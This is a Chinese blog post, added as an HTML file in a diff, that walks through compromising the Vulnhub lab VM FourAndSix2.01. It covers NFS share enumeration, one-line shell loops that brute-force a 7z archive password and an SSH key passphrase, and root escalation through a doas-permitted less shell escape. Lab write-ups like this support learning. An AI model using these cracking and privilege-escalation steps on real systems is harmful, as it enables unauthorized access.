@@ -1,0 +1,426 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+  <title>Vulnhub 靶机渗透之 FourAndSix2.01 - 泡枸杞的咸鱼</title>
+  <meta name="renderer" content="webkit" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+<meta name="theme-color" content="#f8f5ec" />
+<meta name="msapplication-navbutton-color" content="#f8f5ec">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">
+
+
+<meta name="author" content="dds2333" /><meta name="description" content="靶机 https://www.vulnhub.com/entry/fourandsix-201,266/ 前期准备 运行环境：VM Workstation，VM Esxi，VirtualBox 皆可 将下载的ova文件直接导入虚拟机 目标 获取 root 权限并且" /><meta name="keywords" content="Hugo, theme, even" />
+
+
+
+
+
+
+<meta name="generator" content="Hugo 0.59.1 with theme even" />
+
+
+<link rel="canonical" href="https://dds2333.github.io/post/2019/09/25/vulnhub_fourandsix2/" />
+<link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+<link rel="manifest" href="/manifest.json">
+<link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5">
+
+
+
+<link href="/sass/main.min.8c3cbcb0324c2bb4875ceccba4007cbad4b4ac8377f33af9953c3e7684534a50.css" rel="stylesheet">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.1.20/dist/jquery.fancybox.min.css" integrity="sha256-7TyXnr2YU040zfSP+rEcz29ggW4j56/ujTPwjMzyqFY=" crossorigin="anonymous">
+
+
+<meta property="og:title" content="Vulnhub 靶机渗透之 FourAndSix2.01" />
+<meta property="og:description" content="靶机 https://www.vulnhub.com/entry/fourandsix-201,266/ 前期准备 运行环境：VM Workstation，VM Esxi，VirtualBox 皆可 将下载的ova文件直接导入虚拟机 目标 获取 root 权限并且" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://dds2333.github.io/post/2019/09/25/vulnhub_fourandsix2/" />
+<meta property="article:published_time" content="2019-09-25T22:02:51+08:00" />
+<meta property="article:modified_time" content="2019-09-25T22:02:51+08:00" />
+<meta itemprop="name" content="Vulnhub 靶机渗透之 FourAndSix2.01">
+<meta itemprop="description" content="靶机 https://www.vulnhub.com/entry/fourandsix-201,266/ 前期准备 运行环境：VM Workstation，VM Esxi，VirtualBox 皆可 将下载的ova文件直接导入虚拟机 目标 获取 root 权限并且">
+
+
+<meta itemprop="datePublished" content="2019-09-25T22:02:51&#43;08:00" />
+<meta itemprop="dateModified" content="2019-09-25T22:02:51&#43;08:00" />
+<meta itemprop="wordCount" content="914">
+
+
+
+<meta itemprop="keywords" content="Vulnhub,渗透测试," />
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Vulnhub 靶机渗透之 FourAndSix2.01"/>
+<meta name="twitter:description" content="靶机 https://www.vulnhub.com/entry/fourandsix-201,266/ 前期准备 运行环境：VM Workstation，VM Esxi，VirtualBox 皆可 将下载的ova文件直接导入虚拟机 目标 获取 root 权限并且"/>
+
+<!--[if lte IE 9]>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js"></script>
+<![endif]-->
+
+<!--[if lt IE 9]>
+  <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
+<![endif]-->
+
+</head>
+<body>
+  <div id="mobile-navbar" class="mobile-navbar">
+  <div class="mobile-header-logo">
+    <a href="/" class="logo">泡枸杞的咸鱼</a>
+  </div>
+  <div class="mobile-navbar-icon">
+    <span></span>
+    <span></span>
+    <span></span>
+  </div>
+</div>
+<nav id="mobile-menu" class="mobile-menu slideout-menu">
+  <ul class="mobile-menu-list">
+    <a href="/">
+        <li class="mobile-menu-item">主页</li>
+      </a><a href="/post/">
+        <li class="mobile-menu-item">归档</li>
+      </a><a href="/tags/">
+        <li class="mobile-menu-item">标签</li>
+      </a><a href="/categories/">
+        <li class="mobile-menu-item">分类</li>
+      </a><a href="/about/">
+        <li class="mobile-menu-item">关于我</li>
+      </a>
+  </ul>
+</nav>
+  <div class="container" id="mobile-panel">
+    <header id="header" class="header">
+        <div class="logo-wrapper">
+  <a href="/" class="logo">泡枸杞的咸鱼</a>
+</div>
+
+<nav class="site-navbar">
+  <ul id="menu" class="menu">
+    <li class="menu-item">
+        <a class="menu-item-link" href="/">主页</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="/post/">归档</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="/tags/">标签</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="/categories/">分类</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="/about/">关于我</a>
+      </li>
+  </ul>
+</nav>
+    </header>
+
+    <main id="main" class="main">
+      <div class="content-wrapper">
+        <div id="content" class="content">
+          <article class="post">
+    
+    <header class="post-header">
+      <h1 class="post-title">Vulnhub 靶机渗透之 FourAndSix2.01</h1>
+
+      <div class="post-meta">
+        <span class="post-time"> 2019-09-25 </span>
+        <div class="post-category">
+            <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"> 渗透测试 </a>
+            </div>
+          <span class="more-meta"> 约 914 字 </span>
+          <span class="more-meta"> 预计阅读 2 分钟 </span>
+        
+      </div>
+    </header>
+
+    <div class="post-toc" id="post-toc">
+  <h2 class="post-toc-title">文章目录</h2>
+  <div class="post-toc-content always-active">
+    <nav id="TableOfContents">
+<ul>
+<li><a href="#靶机">靶机</a></li>
+<li><a href="#前期准备">前期准备</a></li>
+<li><a href="#目标">目标</a></li>
+<li><a href="#主机信息">主机信息</a></li>
+<li><a href="#服务发现">服务发现</a></li>
+<li><a href="#探测已知服务">探测已知服务</a></li>
+<li><a href="#参考">参考</a></li>
+</ul>
+</nav>
+  </div>
+</div>
+    <div class="post-content">
+      
+
+<h1 id="靶机">靶机</h1>
+
+<p><a href="https://www.vulnhub.com/entry/fourandsix-201,266/">https://www.vulnhub.com/entry/fourandsix-201,266/</a></p>
+
+<h1 id="前期准备">前期准备</h1>
+
+<p>运行环境：VM Workstation，VM Esxi，VirtualBox 皆可</p>
+
+<p>将下载的ova文件直接导入虚拟机</p>
+
+<h1 id="目标">目标</h1>
+
+<p>获取 root 权限并且读取 /root/flag.txt</p>
+
+<h1 id="主机信息">主机信息</h1>
+
+<p>在 VM Workstation中打开导入的虚拟机，系统启动后可看到当前虚拟机 IP</p>
+
+<p><img src="/img/2019/09/25/vm_machineinfo.png" alt="靶机信息" /></p>
+
+<p>当前靶机 IP 为192.168.32.135</p>
+
+<h1 id="服务发现">服务发现</h1>
+
+<p>使用 Nmap 对靶机进行扫描</p>
+
+<p><img src="/img/2019/09/25/nmap_1.png" alt="Nmap扫描" /></p>
+
+<p><img src="/img/2019/09/25/nmap_2.png" alt="Nmap扫描" /></p>
+
+<h1 id="探测已知服务">探测已知服务</h1>
+
+<p>开放 2049 端口，nmap 探测显示为 nfs 服务，使用 msf 扫描靶机可挂载目录</p>
+
+<p><img src="/img/2019/09/25/msf_scan.png" alt="msf扫描挂载目录" /></p>
+
+<p>发现可挂载目录/home/user/storage</p>
+
+<p>挂载目录：nfspysh -o server=192.168.32.135:/home/user/storage /root</p>
+
+<p><img src="/img/2019/09/25/nfs_mount.png" alt="nfspysh挂载目录" /></p>
+
+<p>发现 backup.7z 压缩包，使用 get backup.7z 下载到本地</p>
+
+<p><img src="/img/2019/09/25/get_file.png" alt="下载backup.7z到本地" /></p>
+
+<p>使用 7z e backup.7z 尝试解压，提示需要密码</p>
+
+<p><img src="/img/2019/09/25/atemp_unzip.png" alt="尝试解压" /></p>
+
+<p>此处可用 rarcrack 对 7z 压缩包进行暴力破解（经测试，速度慢）</p>
+
+<p>./rarcrack &ndash;thread 4 &ndash;type 7z backup.7z</p>
+
+<p>工具地址：<a href="http://rarcrack.sourceforge.net/">http://rarcrack.sourceforge.net/</a></p>
+
+<p>因此选择使用 7z 命令进行字典爆破</p>
+
+<p>7z-crack.sh：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><span class="lnt">1
+</span></pre></td>
+<td class="lntd">
+<pre class="chroma">cat $2 | while read line;do if 7z e $1 -p&#34;$line&#34; 1&gt;/dev/null 2&gt;/dev/null;then echo &#34;FOUND PASSWORD:&#34;$line;break;fi;done</pre></td></tr></table>
+</div>
+</div>
+<p>命令如下：</p>
+
+<p>bash 7z-crack.sh backup.7z /usr/share/wordlists/rockyou.txt</p>
+
+<p>注：rockyou.txt 是 kali 自带的字典</p>
+
+<p>运行命令后，稍等片刻可得密码为 chocolate</p>
+
+<p><img src="/img/2019/09/25/zip_pass.png" alt="爆破7z压缩包密码" /></p>
+
+<p>解压 backup.7z 发现一堆图片，以及 id_rsa 和 id_rsa.pub</p>
+
+<p><img src="/img/2019/09/25/file_info.png" alt="压缩包文件" /></p>
+
+<p>猜测可以通过公私钥登录服务器，将私钥放到/root/.ssh目录（cp id_rsa .ssh）下，连接服务器</p>
+
+<p><img src="/img/2019/09/25/enter_rsa.PNG" alt="尝试私钥登录服务器" /></p>
+
+<p>提示需要输入密码，写 shell 脚本破解私钥密码</p>
+
+<p>id_rsa-crack.sh：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><span class="lnt">1
+</span></pre></td>
+<td class="lntd">
+<pre class="chroma">cat /usr/share/wordlists/rockyou.txt | while read line;do if ssh-keygen -p -P $line -N $line -f /root/id_rsa 1&gt;/dev/null 2&gt;/dev/null;then echo &#34;PASSWORD FOUND : &#34;$line;break;fi;done;</pre></td></tr></table>
+</div>
+</div>
+<p>命令如下：</p>
+
+<p>bash id_rsa-crack.sh id_rsa /usr/share/wordlists/rockyou.txt</p>
+
+<p><img src="/img/2019/09/25/rsa_key.PNG" alt="爆破rsa私钥保护密钥" /></p>
+
+<p>爆破得到密码为12345678，连接服务器</p>
+
+<p>ssh user@192.168.32.135（user 用户从挂载 nfs 服务时的目录可得到）</p>
+
+<p>查看当前用户权限及系统信息</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></pre></td>
+<td class="lntd">
+<pre class="chroma">fourandsix2$ id
+
+uid=1000(user) gid=1000(user) groups=1000(user), 0(wheel)
+
+fourandsix2$ uname -a
+
+OpenBSD fourandsix2.localdomain 6.4 GENERIC#349 amd64</pre></td></tr></table>
+</div>
+</div>
+<p>查看/etc目录，有 doas.conf</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></pre></td>
+<td class="lntd">
+<pre class="chroma">fourandsix2$ cat /etc/doas.conf
+
+permit nopass keepenv user as root cmd /usr/bin/less args /var/log/authlog
+
+permit nopass keepenv root as root</pre></td></tr></table>
+</div>
+</div>
+<blockquote>
+<p>doas 是 BSD 系列系统下的权限管理工具，类似于 Debian 系列下的 sudo 命令</p>
+</blockquote>
+
+<p>从 doas.conf文件可以看到，当前用户能够以 root 权限使用 less 命令查看/var/log/authlog 文件，并且不需要当前用户密码以及 root 密码</p>
+
+<p>那么我们可以通过 less 进行提权</p>
+
+<p>先用 doas /usr/bin/less /var/log/authlog 查看日志文件，然后直接按 v，可进入编辑模式，但是会提示只读，进入编辑模式后，可以通过 vi 编辑器操作方式，执行系统命令，即按 Esc 键，输入:!/bin/sh 并回车，此时便会提升到 root 权限</p>
+
+<p><img src="/img/2019/09/25/less提权.PNG" alt="less提权" /></p>
+
+<p>再次查看权限信息时已显示为 root 权限</p>
+
+<p><img src="/img/2019/09/25/提权成功.PNG" alt="less提权后的权限信息" /></p>
+
+<p>读取/root/flag.txt内容</p>
+
+<p><img src="/img/2019/09/25/flag.png" alt="读取flag.txt信息" /></p>
+
+<h1 id="参考">参考</h1>
+
+<p><a href="https://www.kkzevip.com/?post=38">https://www.kkzevip.com/?post=38</a></p>
+
+    </div>
+
+    <div class="post-copyright">
+  <p class="copyright-item">
+    <span class="item-title">文章作者</span>
+    <span class="item-content">dds2333</span>
+  </p>
+  <p class="copyright-item">
+    <span class="item-title">上次更新</span>
+    <span class="item-content">
+        2019-09-25
+        
+    </span>
+  </p>
+  
+  
+</div>
+<footer class="post-footer">
+      <div class="post-tags">
+          <a href="/tags/vulnhub/">Vulnhub</a>
+          <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a>
+          </div>
+      <nav class="post-nav">
+        <a class="prev" href="/post/2019/11/28/cert_tool/">
+            <i class="iconfont icon-left"></i>
+            <span class="prev-text nav-default">数字证书验证</span>
+            <span class="prev-text nav-mobile">上一篇</span>
+          </a>
+        <a class="next" href="/post/2019/09/17/think/">
+            <span class="next-text nav-default">随意写写</span>
+            <span class="next-text nav-mobile">下一篇</span>
+            <i class="iconfont icon-right"></i>
+          </a>
+      </nav>
+    </footer>
+  </article>
+        </div>
+        
+
+  
+
+  
+
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="social-links">
+      <a href="mailto:dds2014@live.cn" class="iconfont icon-email" title="email"></a>
+      <a href="https://github.com/dds2333" class="iconfont icon-github" title="github"></a>
+  <a href="https://dds2333.github.io/index.xml" type="application/rss+xml" class="iconfont icon-rss" title="rss"></a>
+</div>
+
+<div class="copyright">
+  <span class="power-by">
+    由 <a class="hexo-link" href="https://gohugo.io">Hugo</a> 强力驱动
+  </span>
+  <span class="division">|</span>
+  <span class="theme-info">
+    主题 - 
+    <a class="theme-link" href="https://github.com/olOwOlo/hugo-theme-even">Even</a>
+  </span>
+
+  
+
+  <span class="copyright-year">
+    &copy; 
+    2019 - 
+    2020
+    <span class="heart">
+      <i class="iconfont icon-heart"></i>
+    </span>
+    <span class="author">dds2333</span>
+  </span>
+</div>
+    </footer>
+
+    <div class="back-to-top" id="back-to-top">
+      <i class="iconfont icon-up"></i>
+    </div>
+  </div>
+  
+  <script src="https://cdn.jsdelivr.net/npm/jquery@3.2.1/dist/jquery.min.js" integrity="sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4=" crossorigin="anonymous"></script>
+  <script src="https://cdn.jsdelivr.net/npm/slideout@1.0.1/dist/slideout.min.js" integrity="sha256-t+zJ/g8/KXIJMjSVQdnibt4dlaDxc9zXr/9oNPeWqdg=" crossorigin="anonymous"></script>
+  <script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.1.20/dist/jquery.fancybox.min.js" integrity="sha256-XVLffZaxoWfGUEbdzuLi7pwaUJv1cecsQJQqGLe7axY=" crossorigin="anonymous"></script>
+
+
+
+<script type="text/javascript" src="/js/main.min.d7b7ada643c9c1a983026e177f141f7363b4640d619caf01d8831a6718cd44ea.js"></script>
+
+
+
+
+
+
+
+
+</body>
+</html>
